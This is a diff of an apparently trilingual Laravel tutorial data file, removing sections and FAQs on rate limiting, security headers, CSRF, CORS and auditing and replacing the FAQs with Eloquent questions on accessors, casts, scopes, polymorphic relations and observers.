-        ? Limit::perHour(500)->by($request->user()->id)
-        : Limit::perHour(50)->by($request->user()->id);
-});
-
-// When the limit is hit, Laravel automatically returns:
-// HTTP 429 Too Many Requests
-// Headers: Retry-After: 60, X-RateLimit-Remaining: 0`,
-        },
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>What happens when the limit is hit:</b>\n\nLaravel returns `429 Too Many Requests` automatically. The response includes:\n• `Retry-After: 60` — how many seconds until the limit resets\n• `X-RateLimit-Limit: 5` — the maximum allowed requests\n• `X-RateLimit-Remaining: 0` — remaining requests in the window\n\n<b>Recommended limits for common endpoints:</b>\n• Login / register: `throttle:5,1` (5 per minute — aggressive brute-force protection)\n• Password reset: `throttle:3,1` (3 per minute)\n• General API: `throttle:60,1` (60 per minute per user)\n• Public search: `throttle:30,1` (30 per minute per IP)\n\n↳ For advanced protection, use a dedicated package like `laravel-security` or put a WAF (Cloudflare, AWS WAF) in front of your app.",
-            np: "429 response मा `Retry-After` header। Login: 5/min, API: 60/min, Search: 30/min।",
-            jp: "制限超過で 429。`Retry-After` ヘッダーで再試行タイミングを通知。エンドポイント別に設定推奨。",
-          },
-        },
-      ],
-    },
-    {
-      title: {
-        en: "Security headers & Content Security Policy",
-        np: "Security headers",
-        jp: "セキュリティヘッダーとCSP",
-      },
-      blocks: [
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>Security headers</b> are HTTP response headers that tell the browser how to behave — like safety rules posted on the wall.\n\nWithout them, browsers allow by default:\n• Your page to be embedded in iframes on other sites (<b>clickjacking</b>)\n• Mixed HTTP/HTTPS content (downgrades TLS protection)\n• Scripts loaded from any domain (XSS amplified)\n• Browser sniffing your content type (MIME sniffing attacks)\n\nAdding security headers <b>costs you nothing</b> (a single middleware) and prevents entire categories of attack that would otherwise require complex code fixes.",
-            np: "Security headers = browser लाई safety rules। Clickjacking, MIME sniffing, mixed content रोक्छ।",
-            jp: "セキュリティヘッダーはブラウザへの安全規則。クリックジャッキング・MIME スニッフィングを防ぐ。",
-          },
-        },
-        {
-          type: "code",
-          title: {
-            en: "SecurityHeaders middleware — create and register",
-            np: "SecurityHeaders middleware",
-            jp: "セキュリティヘッダーミドルウェア",
-          },
-          code: `<?php
-// app/Http/Middleware/SecurityHeaders.php
-namespace App\\Http\\Middleware;
-
-use Closure;
-use Illuminate\\Http\\Request;
-
-class SecurityHeaders
-{
-    public function handle(Request $request, Closure $next): mixed
-    {
-        $response = $next($request);
-
-        $response->headers->set('X-Frame-Options', 'SAMEORIGIN');
-        $response->headers->set('X-Content-Type-Options', 'nosniff');
-        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
-        $response->headers->set('Permissions-Policy', 'geolocation=(), camera=(), microphone=()');
-        $response->headers->set(
-            'Content-Security-Policy',
-            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
-        );
-
-        return $response;
-    }
-}
-
-// Register globally in bootstrap/app.php (Laravel 11)
-->withMiddleware(function (Middleware $middleware) {
-    $middleware->append(SecurityHeaders::class);
-})`,
-        },
-        {
-          type: "table",
-          caption: {
-            en: "Key security headers — what they do and the recommended value",
-            np: "Security headers cheat-sheet",
-            jp: "セキュリティヘッダー一覧",
-          },
-          headers: [
-            { en: "Header", np: "Header", jp: "ヘッダー" },
-            { en: "What it prevents", np: "के रोक्छ", jp: "防ぐ攻撃" },
-            { en: "Recommended value", np: "सिफारिस value", jp: "推奨値" },
-          ],
-          rows: [
-            [
-              { en: "X-Frame-Options", np: "X-Frame-Options", jp: "X-Frame-Options" },
-              { en: "Clickjacking — embedding your site in a hidden iframe", np: "Clickjacking", jp: "クリックジャッキング" },
-              { en: "`SAMEORIGIN`", np: "`SAMEORIGIN`", jp: "`SAMEORIGIN`" },
-            ],
-            [
-              { en: "X-Content-Type-Options", np: "X-Content-Type-Options", jp: "X-Content-Type-Options" },
-              { en: "MIME sniffing — browser guessing content type and running scripts", np: "MIME sniffing", jp: "MIME スニッフィング" },
-              { en: "`nosniff`", np: "`nosniff`", jp: "`nosniff`" },
-            ],
-            [
-              { en: "Content-Security-Policy", np: "CSP", jp: "CSP" },
-              { en: "XSS via inline scripts or external script sources", np: "XSS", jp: "XSS（スクリプト注入）" },
-              { en: "`default-src 'self'`", np: "`default-src 'self'`", jp: "`default-src 'self'`" },
-            ],
-            [
-              { en: "Strict-Transport-Security", np: "HSTS", jp: "HSTS" },
-              { en: "HTTP downgrade attacks — forcing HTTPS", np: "HTTP downgrade", jp: "HTTP ダウングレード攻撃" },
-              { en: "`max-age=31536000; includeSubDomains`", np: "max-age=31536000", jp: "max-age=31536000" },
-            ],
-            [
-              { en: "Referrer-Policy", np: "Referrer-Policy", jp: "Referrer-Policy" },
-              { en: "Information leakage in the Referer header to third parties", np: "Referer leakage", jp: "リファラ情報漏洩" },
-              { en: "`strict-origin-when-cross-origin`", np: "strict-origin-when-cross-origin", jp: "strict-origin-when-cross-origin" },
-            ],
-          ],
         },
       ],
     },
@@ -340,62 +445,62 @@ class SecurityHeaders
   faq: [
     {
       question: {
-        en: "Does CSRF protection work with Sanctum SPA cookie mode?",
-        np: "Sanctum SPA cookie mode मा CSRF काम गर्छ?",
-        jp: "Sanctum の SPA クッキーモードで CSRF は機能しますか？",
+        en: "When should I use an accessor vs a plain getter method on the model?",
+        np: "Accessor vs getter method — कहिले कुन?",
+        jp: "アクセサとゲッターメソッドはどう使い分けますか？",
       },
       answer: {
-        en: "Yes — Sanctum SPA cookie mode uses CSRF protection differently from form-based apps.\n\n<b>How it works:</b>\n1. The SPA calls `GET /sanctum/csrf-cookie` once — this sets the `XSRF-TOKEN` cookie\n2. For every mutating request (POST, PUT, DELETE), the SPA sends the cookie value as an `X-XSRF-TOKEN` header\n3. Sanctum verifies the header matches the cookie — an attacker's site cannot read your cookie, so it cannot forge the header\n\nAxios sends the `X-XSRF-TOKEN` header automatically when it finds the `XSRF-TOKEN` cookie — no manual setup needed.\n\n<b>Token mode (Authorization: Bearer):</b> CSRF is irrelevant. Bearer tokens must be explicitly attached to requests — they are never sent automatically by the browser, so CSRF cannot exploit them.",
-        np: "SPA mode: `GET /sanctum/csrf-cookie` → `XSRF-TOKEN` cookie → `X-XSRF-TOKEN` header। Bearer token mode मा CSRF irrelevant।",
-        jp: "SPA は `/sanctum/csrf-cookie` で XSRF-TOKEN を取得し X-XSRF-TOKEN ヘッダーで送信。Bearer トークンモードは CSRF 不要。",
+        en: "<b>Use an accessor</b> when the value behaves like a natural attribute of the model:\n• It integrates with `$model->attribute_name` syntax automatically\n• It is included in `->toArray()` and JSON serialisation\n• Example: `full_name`, `avatar_url`, `formatted_price`\n\n<b>Use a plain method</b> when the operation reads like an action or requires parameters:\n• `$model->getFormattedAddress($format)` — takes a parameter\n• `$model->calculateTax($rate)` — performs a calculation, not just reading data\n• It's clearer that calling it has intent, not just property access\n\nRule of thumb: if you'd describe it as \"the model's X\", use an accessor. If you'd describe it as \"getting the model's X given Y\", use a method.",
+        np: "Accessor = attribute-like value (toArray मा पनि)। Method = parameter लिने वा calculation गर्ने।",
+        jp: "属性のように扱うならアクセサ、引数や計算が必要ならメソッドが適切。",
       },
     },
     {
       question: {
-        en: "How do I prevent timing attacks on password comparisons?",
-        np: "Timing attacks रोक्ने तरिका?",
-        jp: "パスワード比較のタイミング攻撃を防ぐには？",
+        en: "What is the difference between `$casts` and `$dates`?",
+        np: "`$casts` र `$dates` को फरक?",
+        jp: "`$casts` と `$dates` の違いは？",
       },
       answer: {
-        en: "Never compare passwords or tokens with `===` or `==`.\n\nA <b>timing attack</b> exploits the fact that `==` returns `false` as soon as it finds a mismatched character — shorter mismatches take less time to compute. By measuring response time thousands of times, an attacker can determine password length and individual characters.\n\n<b>Use `Hash::check()`</b> for passwords — it uses `hash_equals()` internally, which takes the <b>same amount of time regardless of where the strings differ</b>.\n\n`Hash::check('userInput', $storedHash)` — always safe\n\nFor API tokens or HMAC signatures, use `hash_equals($expected, $actual)` directly.\n\n↳ The time difference is nanoseconds — invisible to humans, but measurable by an automated attacker making millions of requests.",
-        np: "`Hash::check()` प्रयोग गर्नुहोस् — `hash_equals()` internally। `===` timing attack को लागि vulnerable छ।",
-        jp: "パスワード比較は必ず `Hash::check()`。内部で `hash_equals()` を使い比較時間を一定に保つ。",
+        en: "`$dates` is the <b>old way</b> to tell Eloquent \"cast this column to a Carbon instance.\" It is <b>deprecated as of Laravel 10</b> and will be removed in a future version.\n\n<b>Always use `$casts` for new code:</b>\n• `'published_at' => 'datetime'` → Carbon (mutable)\n• `'published_at' => 'immutable_datetime'` → CarbonImmutable (preferred — mutations return a new instance)\n• `'created_at'` and `'updated_at'` are automatically cast to Carbon by Eloquent — no entry needed\n\n↳ `immutable_datetime` is safer in pipelines because you can't accidentally mutate the original value.",
+        np: "`$dates` deprecated छ। `$casts` मा `datetime` वा `immutable_datetime` प्रयोग गर्नुहोस्।",
+        jp: "`$dates` は非推奨。`$casts` で `datetime` または `immutable_datetime` を使用する。",
       },
     },
     {
       question: {
-        en: "Should I sanitize input on save, or escape output on render?",
-        np: "Input sanitize गर्ने कि output escape?",
-        jp: "入力をサニタイズすべきですか、出力をエスケープすべきですか？",
+        en: "Can local scopes conflict with each other when chained?",
+        np: "Chained scopes conflict हुन्छन् कि?",
+        jp: "スコープをチェーンするとき競合しますか？",
       },
       answer: {
-        en: "<b>Both — they are complementary, not alternatives.</b>\n\n• <b>Validate on input</b> (Day 5): reject or normalise data that does not match the expected format — wrong email format, string where an integer is expected\n• <b>Sanitize on input</b>: strip or encode characters that should not be stored — e.g. `strip_tags()` on plain-text fields\n• <b>Escape on output</b>: always use `{{ }}` in Blade, even for data you believe is already clean\n\n<b>Why both?</b> Data flows through many paths:\n• Stored via the web form (validated)\n• Imported via a CSV upload (not validated)\n• Seeded by a developer (not sanitized)\n• Fetched from a third-party API (unknown format)\n\nEscaping at output is the last line of defence that catches everything.",
-        np: "Input validation + sanitize on save + escape on output — तिनीहरू complementary हुन्।",
-        jp: "入力バリデーション・保存時サニタイズ・出力エスケープは補完関係。どれか一つでは不十分。",
+        en: "No — local scopes are just query builder calls under the hood, and query builder calls stack cleanly. Each scope adds its `WHERE` clause to the same underlying query.\n\nThe only potential conflict is if <b>two global scopes</b> filter the same column with incompatible conditions:\n• Global scope A: `->where('status', 'published')`\n• Global scope B: `->where('status', 'draft')`\n→ Both apply; the query returns no results (impossible condition)\n\nFix: remove the conflicting scope with `withoutGlobalScope(MyScope::class)` or `withoutGlobalScopes()` (removes all).\n\nFor local scopes, the only thing to watch is ordering — `scopeRecent()` using `orderBy` after another `orderBy` can produce surprising results. Use `reorder()` to clear previous orderings first.",
+        np: "Local scopes stack cleanly। Global scopes same column filter गर्छन् भने conflict हुन सक्छ।",
+        jp: "ローカルスコープはスタックで問題なし。グローバルスコープ同士が同列を競合する場合は `withoutGlobalScope` で除外。",
       },
     },
     {
       question: {
-        en: "What is CORS and how does it relate to security?",
-        np: "CORS र security को सम्बन्ध?",
-        jp: "CORS とセキュリティの関係は？",
+        en: "What is a polymorphic many-to-many relationship?",
+        np: "Polymorphic many-to-many भनेको के हो?",
+        jp: "ポリモーフィック多対多とは？",
       },
       answer: {
-        en: "<b>CORS (Cross-Origin Resource Sharing)</b> controls which domains can make JavaScript-initiated requests to your API from a browser.\n\n<b>Important nuance:</b> CORS is a <b>browser-level control</b>, not a server-level security measure:\n• A browser respects CORS headers and blocks unauthorised cross-origin requests\n• `curl`, Postman, and server-to-server calls <b>ignore CORS entirely</b>\n• CORS does NOT prevent unauthenticated access — it only restricts which origins browsers allow\n\n<b>Configure CORS in `config/cors.php`:</b>\n• `allowed_origins: ['https://yourapp.com']` — restrict to your frontend domain\n• `allowed_origins: ['*']` — allows ANY domain (never use for authenticated APIs)\n• `supports_credentials: true` — required for Sanctum SPA cookie mode\n\n↳ For authenticated APIs: always set specific origins, never `*`.",
-        np: "CORS = browser-level control। curl/Postman ले ignore गर्छ। `config/cors.php` मा specific origins set गर्नुहोस्।",
-        jp: "CORS はブラウザレベルの制御。curl や Postman は無視する。`config/cors.php` で許可ドメインを限定する。",
+        en: "A regular `belongsToMany` links <b>two specific models</b> via a pivot table (e.g. `Post` ↔ `Tag`).\n\nA <b>polymorphic many-to-many</b> lets a model relate to <b>multiple different model types</b> via a single pivot table.\n\nExample: `Tag` can belong to both `Post` AND `Video`:\n• Migration: `taggables` pivot with `tag_id`, `taggable_id`, `taggable_type`\n• `Tag` model: `morphedByMany(Post::class, 'taggable')` and `morphedByMany(Video::class, 'taggable')`\n• `Post` and `Video` models: `morphToMany(Tag::class, 'taggable')`\n\nOne `tags` table, one `taggables` pivot — works for any model that needs tags.",
+        np: "Polymorphic many-to-many: Tag ले Post र Video दुवैमा belongsToMany हुन्छ।",
+        jp: "ポリモーフィック多対多は 1 つのピボットテーブルで複数モデルと多対多を実現（例: Tag ↔ Post/Video）。",
       },
     },
     {
       question: {
-        en: "How do I audit my Laravel app for security issues?",
-        np: "Security audit कसरी गर्ने?",
-        jp: "Laravel アプリのセキュリティ監査方法は？",
+        en: "Do model observers run inside database transactions?",
+        np: "Observers DB transaction भित्र fire हुन्छन् कि?",
+        jp: "オブザーバはトランザクション内で実行されますか？",
       },
       answer: {
-        en: "<b>Three levels of security auditing:</b>\n\n<b>1. Built-in tools (free):</b>\n• `composer audit` — checks all your dependencies against the PHP Security Advisory Database for known CVEs\n• Laravel Telescope — inspect every request, query, exception, and mail in development\n• `php artisan route:list` — review which routes are public vs protected\n\n<b>2. Automated scanning (free tier available):</b>\n• Enlightn — scans your codebase for security misconfigurations (CORS, CSRF, debug mode in production, exposed .env)\n• Run: `composer require enlightn/enlightn --dev` then `php artisan enlightn`\n\n<b>3. Ongoing hygiene:</b>\n• Keep Laravel and all packages updated: `composer update`\n• Never commit `.env` to version control\n• Set `APP_DEBUG=false` and `APP_ENV=production` in production\n• Use `config:cache` and `route:cache` — they fail loudly if misconfigured\n\n↳ Run `composer audit` as part of your CI pipeline so new CVEs are caught before deployment.",
-        np: "`composer audit`, Telescope, Enlightn, `APP_DEBUG=false` production मा।",
-        jp: "`composer audit`・Telescope・Enlightn で監査。本番は `APP_DEBUG=false`、`.env` はコミットしない。",
+        en: "Yes — and this can cause a subtle bug.\n\nIf you run a save inside a `DB::transaction()` and the transaction is <b>rolled back</b>, the `created`/`updated` event has already fired and your observer's side-effects have already happened:\n• Email sent to user → cannot be unsent\n• File written to disk → file is now orphaned\n\n<b>Two solutions:</b>\n1. Use `DB::afterCommit()` to delay the observer logic until after a successful commit\n2. Set `public bool $afterCommit = true` on any listener/job dispatched from the observer — queued jobs won't dispatch until the transaction commits\n\n↳ For simple apps without transactions, this is a non-issue. For financial or critical data, always use the `$afterCommit` flag.",
+        np: "Transaction rollback हुँदा observer पहिल्यै fire भइसकेको हुन्छ। `$afterCommit = true` प्रयोग गर्नुहोस्।",
+        jp: "ロールバック後もオブザーバは発火済み。`$afterCommit = true` でコミット後のみ実行できる。",
       },
     },
   ],
